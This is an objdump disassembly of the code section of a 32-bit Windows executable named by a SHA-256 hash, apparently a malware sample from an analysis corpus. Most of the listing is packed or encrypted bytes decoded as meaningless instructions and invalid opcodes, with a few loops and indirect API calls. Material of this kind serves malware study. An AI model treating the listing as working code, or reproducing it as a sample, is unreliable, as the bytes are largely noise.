
ba6a7e00e1707e694ca6fe35e53e851272844386663ce5d5b446d3c9f4ad2f21.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0xad066c8c
  40101f:	pop    esp
  401020:	jle    0x4010a0
  401022:	jle    0x4010a2
  401024:	cwde   
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	rol    eax,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	sysexit 
  401036:	add    BYTE PTR [edi],cl
  401038:	xor    ecx,DWORD PTR [edi]
  40103a:	rcr    BYTE PTR [eax],0xc7
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0xb0beb59e
  4010d2:	ss arpl cx,dx
  4010d5:	clc    
  4010d6:	lods   al,BYTE PTR ds:[esi]
  4010d7:	adc    ebx,ebx
  4010d9:	push   edi
  4010da:	in     al,dx
  4010db:	cwde   
  4010dc:	sbb    eax,0xe2e33856
  4010e1:	icebp  
  4010e2:	push   ds
  4010e3:	or     eax,0x23808849
  4010e8:	xchg   ecx,eax
  4010e9:	jns    0x4010ee
  4010eb:	(bad)  
  4010ed:	jne    0x401124
  4010ef:	cli    
  4010f0:	imul   eax,DWORD PTR [ecx+0x79],0xf3a400f1
  4010f7:	jmp    0x3b8caeaa
  4010fc:	mov    ch,0x3c
  4010fe:	sub    esi,DWORD PTR [ebx-0x13794336]
  401104:	rcl    DWORD PTR [edx],1
  401106:	add    cl,BYTE PTR [edx-0x5a]
  401109:	imul   ebp,DWORD PTR [esi+0x44c0fbba],0x2c
  401110:	jo     0x401155
  401112:	inc    eax
  401113:	call   0x57753fbd
  401118:	xor    eax,0x25c418ac
  40111d:	data16 sti 
  40111f:	jmp    0x401101
  401121:	cmp    bl,BYTE PTR [esp+eiz*2+0x86316]
  401128:	jno    0x40119b
  40112a:	fs ret 
  40112c:	inc    eax
  40112d:	inc    esp
  40112e:	dec    DWORD PTR [ebp+ebx*8+0x4dfeb4bc]
  401135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401136:	popf   
  401137:	imul   eax,DWORD PTR [eax+0x2e],0xfffffff6
  40113b:	xor    DWORD PTR [ebx-0x677d91d7],edi
  401141:	inc    edx
  401142:	pop    DWORD PTR [esi-0x1d]
  401145:	fcomp  DWORD PTR [eax]
  401147:	(bad)  [ecx+0x2fa6f243]
  40114d:	or     bh,BYTE PTR [eax]
  40114f:	inc    esi
  401150:	inc    ecx
  401151:	shl    DWORD PTR [edi-0xfc066f8],1
  401157:	daa    
  401158:	out    dx,eax
  401159:	test   al,0xfd
  40115b:	pop    edx
  40115c:	add    BYTE PTR [ebp-0x671f36a2],ch
  401162:	mov    cl,0x8c
  401164:	mov    eax,ds:0x36ba0468
  401169:	(bad)
  40116c:	push   ecx
  40116d:	or     bh,ch
  40116f:	or     BYTE PTR [esi+0x10cc6722],cl
  401175:	push   ds
  401176:	sub    dh,bl
  401178:	loopne 0x4011d9
  40117a:	loopne 0x4011f1
  40117c:	xchg   edx,eax
  40117d:	jae    0x401101
  40117f:	fs adc ecx,0x42893123
  401186:	or     ah,dh
  401188:	xor    BYTE PTR [esi-0x372eeaca],cl
  40118e:	je     0x40115d
  401190:	mov    al,0x86
  401192:	fwait
  401193:	pop    edx
  401194:	in     al,0xe2
  401196:	out    dx,al
  401197:	out    0x7e,eax
  401199:	push   ebx
  40119a:	dec    esi
  40119b:	ins    BYTE PTR es:[edi],dx
  40119c:	mov    bl,0x56
  40119e:	ret    0x73e6
  4011a1:	imul   BYTE PTR [edi-0x56]
  4011a4:	push   esp
  4011a5:	and    DWORD PTR [ebx-0x40],eax
  4011a8:	daa    
  4011a9:	sbb    ah,BYTE PTR [eax-0x6d828dde]
  4011af:	in     eax,dx
  4011b0:	mov    bh,0x97
  4011b2:	xchg   esi,eax
  4011b3:	sahf   
  4011b4:	or     dh,BYTE PTR [ebx-0x66163147]
  4011ba:	fs iret 
  4011bc:	aaa    
  4011bd:	clc    
  4011be:	out    dx,al
  4011bf:	aad    0x63
  4011c1:	les    edi,FWORD PTR [ecx-0x54]
  4011c4:	ror    DWORD PTR [edx+ecx*2+0x62],cl
  4011c8:	sahf   
  4011c9:	or     eax,0x86d8220f
  4011ce:	mov    DWORD PTR [ebp-0x20],eax
  4011d1:	mov    ecx,0x5d3a
  4011d6:	mov    ecx,DWORD PTR [ebp-0x20]
  4011d9:	mov    DWORD PTR [ebp-0x24],0x4ec1
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x430355,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x430355
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x430355,ecx
  401209:	cmp    DWORD PTR ds:0x430355,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42eb0b
  401248:	cmp    DWORD PTR ds:0x430355,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x430355
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x430355,ecx
  401262:	cmp    DWORD PTR ds:0x430355,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x43034d,0x1e
  401279:	cmp    DWORD PTR ds:0x43034d,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x43034d,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e8a7
  40129c:	mov    ecx,DWORD PTR ds:0x43034d
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x43034d,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx+0x7da1095]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x40133c
  4012cc:	fwait
  4012cd:	adc    DWORD PTR [esi+0x7b],0xffffffb1
  4012d1:	pop    ebp
  4012d2:	mov    ecx,0xdea6bacc
  4012d7:	mov    al,BYTE PTR ds:0x8dc988f3
  4012dd:	cs push eax
  4012df:	mov    bl,0xa0
  4012e1:	jb     0x40127d
  4012e3:	fidiv  DWORD PTR [esi]
  4012e5:	in     al,dx
  4012e6:	mov    bh,0x85
  4012e8:	dec    esp
  4012e9:	or     eax,0xf4d89751
  4012ee:	ret    0x4555
  4012f1:	adc    al,0x29
  4012f3:	dec    ecx
  4012f4:	push   edx
  4012f5:	adc    DWORD PTR [esi],eax
  4012f7:	jbe    0x401354
  4012f9:	dec    ecx
  4012fa:	sub    al,0xc7
  4012fc:	xchg   DWORD PTR [esi-0x7759daf5],edx
  401302:	das    
  401303:	adc    BYTE PTR [bx-0x1781],bh
  401308:	shl    DWORD PTR [edi+0x49],1
  40130b:	mov    edi,0x9430155e
  401310:	push   es
  401311:	hlt    
  401312:	cmp    BYTE PTR [edx],bl
  401314:	mov    ebx,0xfc3aa9b5
  401319:	dec    edx
  40131a:	popf   
  40131b:	jns    0x4012d8
  40131d:	jmp    0x401342
  40131f:	xor    BYTE PTR ds:0xc08c233a,ah
  401325:	or     al,0x47
  401327:	shl    DWORD PTR ds:0x528ab714,1
  40132d:	sub    edi,0x28
  401330:	and    ah,BYTE PTR [edi+eiz*4+0x37a81aff]
  401337:	xchg   edx,eax
  401338:	sub    eax,0xc81af4ec
  40133d:	popf   
  40133e:	dec    eax
  40133f:	dec    edx
  401340:	mov    cl,0x7
  401342:	and    eax,0x59adf7d7
  401347:	or     esi,eax
  401349:	jl     0x4012ec
  40134b:	ins    BYTE PTR es:[edi],dx
  40134c:	scas   eax,DWORD PTR es:[edi]
  40134d:	mov    al,0x97
  40134f:	adc    BYTE PTR [esi],0xb
  401352:	lods   al,BYTE PTR ds:[esi]
  401353:	xchg   ebp,eax
  401354:	sub    DWORD PTR [ecx-0x5491a341],edi
  40135a:	fmul   DWORD PTR [ecx]
  40135c:	stos   BYTE PTR es:[edi],al
  40135d:	xchg   edx,eax
  40135e:	(bad)  
  40135f:	shl    BYTE PTR [ebp-0xa],1
  401362:	mov    eax,0xf0efff46
  401367:	(bad)  
  401368:	loope  0x401374
  40136a:	loopne 0x401344
  40136c:	push   ds
  40136d:	xor    eax,edi
  40136f:	xlat   BYTE PTR ds:[ebx]
  401370:	and    eax,0xb9a7f8e3
  401375:	mov    dl,0x8
  401377:	jb     0x401325
  401379:	aam    0xf3
  40137b:	or     cl,0x1d
  40137e:	and    DWORD PTR ds:0x631ffc20,0xbcb768c1
  401388:	xor    eax,DWORD PTR [edx]
  40138a:	(bad)  
  40138b:	fs mov ch,0x1e
  40138e:	cmp    edi,edi
  401390:	or     edx,esp
  401392:	aaa    
  401393:	mov    edx,DWORD PTR [ebp+0x5a]
  401396:	ret    
  401397:	icebp  
  401398:	lea    ebp,[edx]
  40139a:	jae    0x40136f
  40139c:	popa   
  40139d:	xchg   DWORD PTR ds:0xec28b8b1,edi
  4013a3:	mov    esi,0x3bc99276
  4013a8:	mov    es,WORD PTR [edi+0x4]
  4013ab:	xor    al,bh
  4013ad:	sub    bl,BYTE PTR [ebx+0x10833787]
  4013b3:	in     eax,0x29
  4013b5:	stos   BYTE PTR es:[edi],al
  4013b6:	sub    ch,dh
  4013b8:	push   edx
  4013b9:	shr    DWORD PTR [esi+edi*1+0xa],cl
  4013bd:	popa   
  4013be:	clc    
  4013bf:	popf   
  4013c0:	aaa    
  4013c1:	int3   
  4013c2:	mov    ebp,0x94d9186f
  4013c7:	inc    ecx
  4013c8:	sbb    eax,0x3a46d9f5
  4013cd:	push   ebp
  4013ce:	and    dh,BYTE PTR [esi+0x6dacd2f7]
  4013d4:	lds    edi,FWORD PTR [ecx+0x40b81e05]
  4013da:	stc    
  4013db:	mov    ecx,DWORD PTR [edi]
  4013dd:	dec    ebp
  4013de:	push   edi
  4013df:	hlt    
  4013e0:	xor    BYTE PTR [eax],bl
  4013e2:	ins    BYTE PTR es:[edi],dx
  4013e3:	push   edx
  4013e4:	xor    eax,0x6c1b0f54
  4013e9:	out    dx,eax
  4013ea:	(bad)  
  4013eb:	xlat   BYTE PTR ds:[ebx]
  4013ec:	mov    ebx,0xef5637f7
  4013f1:	mov    DWORD PTR [ebx+0x458129ee],esi
  4013f7:	xor    dl,ah
  4013f9:	and    eax,0xd47f0025
  4013fe:	push   edx
  4013ff:	shr    ecx,1
  401401:	or     edi,DWORD PTR [edi]
  401403:	mov    BYTE PTR [edx+0x4b],ah
  401406:	add    BYTE PTR [edx+0x71],bh
  401409:	fwait
  40140a:	loopne 0x4013dd
  40140c:	dec    edx
  40140d:	cmp    eax,0x4d1e78f7
  401412:	dec    ebx
  401413:	pop    eax
  401414:	dec    esp
  401415:	shl    BYTE PTR [ecx],0xdd
  401418:	jnp    0x4013f1
  40141a:	loope  0x40146c
  40141c:	out    dx,eax
  40141d:	dec    ebp
  40141e:	pop    edi
  40141f:	ja     0x4013ee
  401421:	shl    cl,1
  401423:	mov    bl,0x54
  401425:	adc    esp,esi
  401427:	jle    0x4013b1
  401429:	mul    esp
  40142b:	mov    cl,0x98
  40142d:	cdq    
  40142e:	aaa    
  40142f:	jge    0x401430
  401431:	imul   ebx,DWORD PTR [eax],0xdf727e2c
  401437:	aad    0x33
  401439:	imul   DWORD PTR [ecx-0x4f3b2843]
  40143f:	push   edi
  401440:	rcr    dl,0x16
  401443:	ret    
  401444:	dec    eax
  401445:	je     0x401479
  401447:	mov    bh,cl
  401449:	out    dx,al
  40144a:	popf   
  40144b:	sub    ah,dl
  40144d:	scas   al,BYTE PTR es:[edi]
  40144e:	(bad)  
  40144f:	fcompp 
  401451:	dec    edx
  401452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401453:	pop    ebx
  401454:	pop    ebx
  401455:	je     0x4014ae
  401457:	mov    ds:0x22fbfe92,al
  40145c:	and    eax,0xc3ac75fd
  401461:	data16 jmp 0x401468
  401464:	push   edi
  401465:	adc    ebx,DWORD PTR [esi+0x36301541]
  40146b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146c:	cli    
  40146d:	mov    edx,0x56b43608
  401472:	mov    ecx,0x8a3c
  401477:	adc    DWORD PTR ds:0x42ecdb,0x2f3d
  401481:	xor    ax,cx
  401484:	movzx  esi,WORD PTR ds:0x430339
  40148b:	or     DWORD PTR ds:0x4303eb,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0xe8010fff
  4014a7:	ret    0xc254
  4014aa:	jge    0x40152a
  4014ac:	jle    0x401446
  4014ae:	jg     0x40152e
  4014b0:	jle    0x401476
  4014b2:	jb     0x4014a6
  4014b4:	jmp    0x401441
  4014b6:	sbb    eax,0xbea193e1
  4014bb:	pushf  
  4014bc:	out    0x7d,al
  4014be:	jnp    0x4014dd
  4014c0:	xor    ebp,DWORD PTR [edi+edx*8]
  4014c3:	dec    ecx
  4014c4:	shr    DWORD PTR [ebp+0x656ca2d6],1
  4014ca:	out    0x97,al
  4014cc:	and    al,BYTE PTR [esi]
  4014ce:	aad    0x41
  4014d0:	jne    0x40154a
  4014d2:	imul   bl
  4014d4:	pop    esi
  4014d5:	outs   dx,DWORD PTR ds:[esi]
  4014d6:	xchg   ecx,eax
  4014d7:	popa   
  4014d8:	pop    esi
  4014d9:	popf   
  4014da:	ror    BYTE PTR [eax-0x6d1d257b],cl
  4014e0:	mov    bl,0x74
  4014e2:	dec    ecx
  4014e3:	aad    0xc8
  4014e5:	ja     0x401542
  4014e7:	sub    cl,BYTE PTR [esi]
  4014e9:	dec    eax
  4014ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014eb:	imul   ebp,DWORD PTR [ecx-0x948511f],0x75ba21c6
  4014f5:	inc    edx
  4014f6:	outs   dx,BYTE PTR ds:[esi]
  4014f7:	pop    eax
  4014f8:	xchg   esi,eax
  4014f9:	mov    ds:0x13b8653b,al
  4014fe:	(bad)  
  401500:	scas   al,BYTE PTR es:[edi]
  401501:	xor    ch,BYTE PTR [edx+ebp*4+0x5ad87f81]
  401508:	adc    al,0xfc
  40150a:	cmp    BYTE PTR [ebx+0x6c7ef9b2],0x64
  401511:	dec    edi
  401512:	mov    ebx,0x3438d126
  401517:	mov    bl,0x5b
  401519:	(bad)  
  40151a:	pop    edx
  40151b:	push   esi
  40151c:	inc    ecx
  40151d:	mov    ds:0x1b3008b,al
  401522:	xchg   ecx,edi
  401524:	and    eax,ecx
  401526:	lods   eax,DWORD PTR ds:[esi]
  401527:	pop    esi
  401528:	repz daa 
  40152a:	xchg   esp,eax
  40152b:	mov    ch,0x65
  40152d:	or     DWORD PTR [edx],edi
  40152f:	mov    ah,0x86
  401531:	jle    0x401526
  401533:	lods   eax,DWORD PTR ds:[esi]
  401534:	pop    ebx
  401535:	fsub   DWORD PTR [ebx+0x140108c7]
  40153b:	imul   eax,DWORD PTR [edi+ebx*2-0xf],0x53
  401540:	xor    al,0x3b
  401542:	jle    0x401515
  401544:	mov    esp,DWORD PTR [esi-0x57896d7d]
  40154a:	cmp    BYTE PTR [eax+edi*1+0x3a901adb],0x83
  401552:	mov    DWORD PTR [ebx],esp
  401554:	jl     0x4014f8
  401556:	jo     0x40153f
  401558:	jb     0x401566
  40155a:	repz std 
  40155c:	mov    ch,0xe
  40155e:	(bad)  [ebx-0x4c]
  401561:	sbb    al,0xc3
  401563:	mov    ecx,0x94efe03a
  401568:	jno    0x4014f6
  40156a:	mov    BYTE PTR [ebx-0x80],dl
  40156d:	sbb    edi,DWORD PTR [eax-0xd27d972]
  401573:	mov    dl,0x62
  401575:	sbb    BYTE PTR [ecx+0x7d6f4d2a],ch
  40157b:	sti    
  40157c:	je     0x4014fe
  40157e:	popf   
  40157f:	mov    ebx,0x27f00862
  401584:	mul    BYTE PTR gs:[edx]
  401587:	mov    dl,0xea
  401589:	scas   al,BYTE PTR es:[edi]
  40158a:	test   eax,0x7c2801c9
  40158f:	ja     0x40155c
  401591:	cmp    bh,BYTE PTR [eax+0x3b]
  401594:	(bad)  
  401595:	pop    eax
  401596:	or     edi,DWORD PTR [ebx+0x2f59cee7]
  40159c:	inc    ecx
  40159d:	outs   dx,DWORD PTR ds:[esi]
  40159e:	jno    0x401590
  4015a0:	adc    al,dh
  4015a2:	xchg   BYTE PTR [ebx],dh
  4015a4:	repz pop esp
  4015a6:	in     eax,0xa5
  4015a8:	or     ah,BYTE PTR [ebp+eax*8-0x521227f0]
  4015af:	mov    eax,DWORD PTR [edx+0x2b4fb662]
  4015b5:	es push 0xffffffa4
  4015b8:	jnp    0x401551
  4015ba:	sbb    bh,dh
  4015bc:	test   al,0x81
  4015be:	pushf  
  4015bf:	popf   
  4015c0:	cwde   
  4015c1:	pop    edi
  4015c2:	mov    gs,ebx
  4015c4:	mov    ebx,DWORD PTR [edi]
  4015c6:	loop   0x40158b
  4015c8:	gs sbb ecx,edx
  4015cb:	adc    cl,cl
  4015cd:	push   ecx
  4015ce:	jnp    0x4015e1
  4015d0:	stos   DWORD PTR es:[edi],eax
  4015d1:	repz leave 
  4015d3:	imul   edi,DWORD PTR [edi-0x66],0xc63a5530
  4015da:	xor    al,0x67
  4015dc:	xor    edx,DWORD PTR [edx+0x4a1f9c0a]
  4015e2:	jle    0x4015a2
  4015e4:	cmp    BYTE PTR [ecx+0x1a],bh
  4015e7:	out    dx,al
  4015e8:	jmp    0x40157e
  4015ea:	mov    dl,dh
  4015ec:	jb     0x4015df
  4015ee:	adc    eax,0x61ecf026
  4015f3:	je     0x40158b
  4015f5:	scas   eax,DWORD PTR es:[edi]
  4015f6:	inc    edx
  4015f7:	xor    ah,ch
  4015f9:	mov    dh,0x2c
  4015fb:	dec    edx
  4015fc:	push   edx
  4015fd:	lods   al,BYTE PTR ds:[esi]
  4015fe:	jecxz  0x40163f
  401600:	(bad)  [eax-0x9]
  401603:	(bad)  
  401604:	mov    ch,0xd7
  401606:	retf   
  401607:	ja     0x401668
  401609:	das    
  40160a:	mov    al,ds:0x6fe7b5d1
  40160f:	lea    esi,[edi-0x57]
  401612:	mov    bh,al
  401614:	les    eax,FWORD PTR [eax+0x69]
  401617:	sub    al,0x28
  401619:	sbb    eax,0x77560d24
  40161e:	push   0x230e22b9
  401623:	outs   dx,DWORD PTR ds:[esi]
  401624:	(bad)  
  401625:	call   0xc6fdc187
  40162a:	fpatan 
  40162c:	dec    ebx
  40162d:	inc    ebx
  40162e:	mov    ch,0x35
  401630:	jg     0x401680
  401632:	mov    es,ebp
  401634:	dec    eax
  401635:	push   ebx
  401636:	dec    ebp
  401637:	(bad)  
  401639:	fcmovnu st,st(0)
  40163b:	popa   
  40163c:	repnz adc esi,DWORD PTR [eax-0x55e96766]
  401643:	shr    DWORD PTR [ebp-0x32b00ac5],cl
  401649:	daa    
  40164a:	lds    eax,FWORD PTR [ebx]
  40164c:	call   0xb02910d3
  401651:	cmp    eax,0xbf1fb45d
  401656:	dec    ebx
  401657:	push   edi
  401658:	and    esi,edi
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	ins    DWORD PTR es:[edi],dx
  40166c:	xchg   ecx,eax
  40166d:	rcl    DWORD PTR [ebx+0x7e7e7a6c],1
  401673:	cwde   
  401674:	jg     0x4016f4
  401676:	jle    0x4016b2
  401678:	pop    ebx
  401679:	dec    esi
  40167a:	cmp    eax,esi
  40167c:	int3   
  40167d:	jns    0x4016d6
  40167f:	rol    DWORD PTR [eax-0x1d],cl
  401682:	out    0x98,eax
  401684:	mov    edx,0x2a00f733
  401689:	jb     0x4016eb
  40168b:	ja     0x401667
  40168d:	xchg   DWORD PTR [edi+0x10],ebx
  401690:	xchg   ebp,eax
  401691:	or     dh,bl
  401693:	sbb    al,al
  401695:	xlat   BYTE PTR ds:[ebx]
  401696:	push   edx
  401697:	sub    esi,esi
  401699:	cli    
  40169a:	rol    ebp,1
  40169c:	stc    
  40169d:	into   
  40169e:	mov    ch,0x92
  4016a0:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016a2:	sbb    esi,DWORD PTR [eax-0x24]
  4016a5:	push   esi
  4016a6:	out    dx,al
  4016a7:	mov    edx,0x5f38449f
  4016ac:	xchg   ecx,eax
  4016ad:	jo     0x401632
  4016af:	fs push ecx
  4016b1:	rol    BYTE PTR [eax-0x32],1
  4016b4:	sar    DWORD PTR [ecx-0x778e44fe],cl
  4016ba:	xchg   DWORD PTR [esp+ebx*1],ecx
  4016bd:	mov    al,0xb9
  4016bf:	iret   
  4016c0:	sbb    cl,BYTE PTR [edx]
  4016c2:	or     DWORD PTR [ecx],ebx
  4016c4:	adc    edi,esp
  4016c6:	in     eax,dx
  4016c7:	jno    0x401732
  4016c9:	nop
  4016ca:	or     al,0x68
  4016cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016cd:	push   cs
  4016ce:	test   bl,bl
  4016d0:	jo     0x401708
  4016d2:	inc    ebx
  4016d3:	dec    esp
  4016d4:	dec    edi
  4016d5:	mov    gs,WORD PTR [edx]
  4016d7:	adc    eax,0xc0de358e
  4016dc:	outs   dx,DWORD PTR ds:[esi]
  4016dd:	push   0xffffffff
  4016df:	cmp    BYTE PTR ds:0x782c8f2b,al
  4016e5:	cmp    BYTE PTR [ebp-0x39],bl
  4016e8:	iret   
  4016e9:	push   0x2e
  4016eb:	aaa    
  4016ec:	outs   dx,DWORD PTR ds:[esi]
  4016ed:	not    DWORD PTR [esi+0x2c892f8c]
  4016f3:	sub    esi,eax
  4016f5:	add    eax,0x12311eeb
  4016fa:	jge    0x401768
  4016fc:	inc    eax
  4016fd:	dec    edi
  4016fe:	and    edx,DWORD PTR [ecx]
  401700:	ja     0x4016ba
  401702:	(bad)  
  401703:	fwait
  401704:	sbb    BYTE PTR [eax+0x75],0x89
  401708:	dec    ecx
  401709:	cmc    
  40170a:	and    dl,BYTE PTR [ebx]
  40170c:	sbb    edx,DWORD PTR [ecx-0x168f1d36]
  401712:	xor    cl,ch
  401714:	stos   BYTE PTR es:[edi],al
  401715:	fnstsw WORD PTR ds:0xf97473c6
  40171b:	lock jle 0x4016a6
  40171e:	or     BYTE PTR [eax],bh
  401720:	xchg   edx,eax
  401721:	add    esi,0x79e13b94
  401727:	ror    dl,cl
  401729:	pop    ss
  40172a:	loop   0x401784
  40172c:	mov    esp,0xfc8e9f82
  401731:	pop    eax
  401732:	mov    DWORD PTR [ebp-0x12],ebp
  401735:	xchg   BYTE PTR [ebx],dl
  401737:	leave  
  401738:	mov    ah,0x3
  40173a:	out    0x33,eax
  40173c:	mov    BYTE PTR [edx-0x5f],dl
  40173f:	jno    0x40176b
  401741:	and    eax,0xea678cd9
  401746:	cmc    
  401747:	lahf   
  401748:	int    0xd1
  40174a:	push   cs
  40174b:	frstpm(287 only) 
  40174d:	jl     0x401753
  40174f:	gs push 0x5adb3a6e
  401755:	and    BYTE PTR [ecx-0x1f60ec1e],cl
  40175b:	fbld   TBYTE PTR ds:0x8e177c0
  401761:	mov    ebx,0xa2eab758
  401766:	xchg   edx,eax
  401767:	mov    edi,0xf0756881
  40176c:	pusha  
  40176d:	cmp    DWORD PTR [eax+0x2c],esi
  401770:	int3   
  401771:	sbb    ch,BYTE PTR ds:0x44949cde
  401777:	scas   eax,DWORD PTR es:[edi]
  401778:	pop    esi
  401779:	jo     0x401783
  40177b:	pop    ebp
  40177c:	xor    ebp,edi
  40177e:	(bad)  
  40177f:	es or  al,al
  401782:	sahf   
  401783:	fs jns 0x4017ae
  401786:	sbb    DWORD PTR [eax+0x74ec35a1],esp
  40178c:	mov    esp,0xad08a860
  401791:	push   esp
  401792:	in     al,dx
  401793:	push   esi
  401794:	in     eax,0x32
  401796:	adc    eax,0xcd43aa01
  40179b:	inc    edx
  40179c:	push   ds
  40179d:	enter  0xc84e,0xcf
  4017a1:	repz or DWORD PTR ss:[edi],esp
  4017a5:	out    dx,al
  4017a6:	call   0xc5ca:0x76108981
  4017ad:	cmp    DWORD PTR [edi],ecx
  4017af:	dec    eax
  4017b0:	mov    ch,0x96
  4017b2:	adc    BYTE PTR [esi-0x405c4269],bl
  4017b8:	push   eax
  4017b9:	ins    DWORD PTR es:[edi],dx
  4017ba:	or     dl,BYTE PTR [ebx]
  4017bc:	mov    eax,ds:0xfd106469
  4017c1:	std    
  4017c2:	imul   edi,DWORD PTR [esi-0x75],0x68529601
  4017c9:	lods   eax,DWORD PTR ds:[esi]
  4017ca:	cmc    
  4017cb:	enter  0x1694,0x59
  4017cf:	or     DWORD PTR [eax+ecx*8+0x25],esi
  4017d3:	cli    
  4017d4:	scas   al,BYTE PTR es:[edi]
  4017d5:	sbb    DWORD PTR [edi+0x3eda7961],0xffffffca
  4017dc:	sub    al,0x8d
  4017de:	mov    esp,0x1e5aa149
  4017e3:	push   0xffffffa2
  4017e5:	scas   eax,DWORD PTR es:[edi]
  4017e6:	arpl   WORD PTR [ecx+0x5009b696],di
  4017ec:	push   0xe8ce1c06
  4017f1:	mov    bl,0x53
  4017f3:	inc    eax
  4017f4:	pop    esp
  4017f5:	mov    esp,0x379eacbf
  4017fa:	and    eax,0xaa43bf8
  4017ff:	mov    eax,ds:0x85121936
  401804:	std    
  401805:	and    BYTE PTR ds:0xc1e6319c,bl
  40180b:	stos   DWORD PTR es:[edi],eax
  40180c:	adc    DWORD PTR [edi],0xffffff80
  40180f:	test   bl,al
  401811:	and    DWORD PTR [edx+0x3ad5c8bb],esp
  401817:	sahf   
  401818:	inc    esp
  401819:	dec    edx
  40181a:	test   DWORD PTR [ecx+0x3b02bf52],ebx
  401820:	add    BYTE PTR [eax],al
  401822:	add    ax,di
  401825:	mov    DWORD PTR ds:0x430355,0x60d8
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x430359,0x0
  40183c:	mov    esi,DWORD PTR ds:0x430359
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x430359,esi
  401849:	cmp    DWORD PTR ds:0x430359,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42e993
  401863:	cmp    DWORD PTR ds:0x430359,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
